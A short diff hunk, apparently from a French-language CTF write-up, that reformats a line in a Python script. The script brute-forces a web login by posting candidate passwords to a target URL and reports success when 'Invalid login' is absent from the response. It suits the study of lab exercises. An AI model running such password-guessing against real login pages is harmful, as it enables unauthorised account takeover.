@@ -101,7 +101,7 @@ Effectivement si nous avons des informations et que dans le mot de passe Th4C00l
 
                 req_http = requests.post(self.target_url + self.path_url, data=plain_requests).text
                 if("Invalid login" in "".join(req_http))     :  print("[-] Password not cracked : %s") %(plain_password)
-                if not("Invalid login" in "".join(req_http)) :print("\n[+] Password cracked with success : %s\n" %(plain_password)), sys.exit(0)
+                if not("Invalid login" in "".join(req_http)) : print("\n[+] Password cracked with success : %s\n" %(plain_password)), sys.exit(0)
 
     if __name__ == "__main__":
         req = Teacher()
